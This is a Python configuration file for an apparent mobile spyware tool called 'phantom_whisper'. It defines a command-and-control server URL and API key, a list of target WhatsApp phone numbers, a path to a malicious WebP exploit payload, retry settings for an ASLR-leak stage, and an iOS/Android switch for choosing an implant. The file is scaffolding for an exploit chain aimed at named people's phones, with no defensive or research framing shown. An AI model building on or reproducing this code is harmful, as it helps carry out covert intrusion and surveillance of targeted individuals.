# phantom_whisper/config.py
from pathlib import Path
from pydantic_settings import BaseSettings, SettingsConfigDict
from typing import List, Any 
from pydantic import Field, SecretStr, field_validator 
from enum import Enum

class OSType(str, Enum):
    """Enum for supported Operating Systems."""
    IOS = "ios"
    ANDROID = "android"

class Settings(BaseSettings):
    """
    Application settings, loaded from environment variables or a .env file.
    """
    model_config = SettingsConfigDict(env_file='.env', extra='ignore')

    # C2 Configuration
    c2_server_base_url: str = "https://your-c2-server.com"
    c2_api_key: SecretStr = Field(..., env='C2_API_KEY', description="API key for C2 server authentication.")
    c2_request_timeout_sec: int = 15 # Default timeout for C2 HTTP requests

    # Target Configuration (supports comma-separated string from env)
    target_whatsapp_ids: List[str] = Field(
        default=["+1234567890", "+1987654321"],
        description="Comma-separated list of target WhatsApp IDs (e.g., '+1234567890,+1987654321')"
    )

    @field_validator('target_whatsapp_ids', mode='before')
    @classmethod
    def split_targets(cls, v: Any) -> List[str]: 
        """Splits a comma-separated string of target IDs into a list, ensuring all elements are strings."""
        if isinstance(v, str):
            # Split by comma, strip whitespace, and filter out empty strings
            return [t.strip() for t in v.split(',') if t.strip()]
        # If it's already a list-like object, ensure all elements are converted to string
        return [str(t) for t in v]


    # Exploit Payload Paths
    malicious_webp_path: Path = Path("./payloads/malicious_webp.bin")

    @field_validator('malicious_webp_path', mode='before')
    @classmethod
    def resolve_path(cls, v: Path) -> Path:
        """Resolves the payload path to an absolute path."""
        # Using resolve() to handle '..' and symlinks, and ensure absolute path
        return v.expanduser().resolve() 

    # ASLR Leak Wait Strategy (Exponential Backoff)
    aslr_wait_time: int = 5 # seconds initial wait
    aslr_max_retries: int = 10 # total attempts
    aslr_max_wait_time: int = 60 # seconds max wait between retries

    # For implant selection: enforces a strict type and value (ios/android)
    OS_TYPE: OSType = OSType.IOS # Example default: iOS

    # Annotation for the derived attribute (for IDEs/mypy)
    c2_api_key_str: str = "" # type: ignore[assignment] # Set in model_post_init, silence mypy

    def model_post_init(self, __context: Any) -> None:
        """Ensures the c2_api_key is available as a plain string after validation."""
        object.__setattr__(self, 'c2_api_key_str', self.c2_api_key.get_secret_value())


settings = Settings()
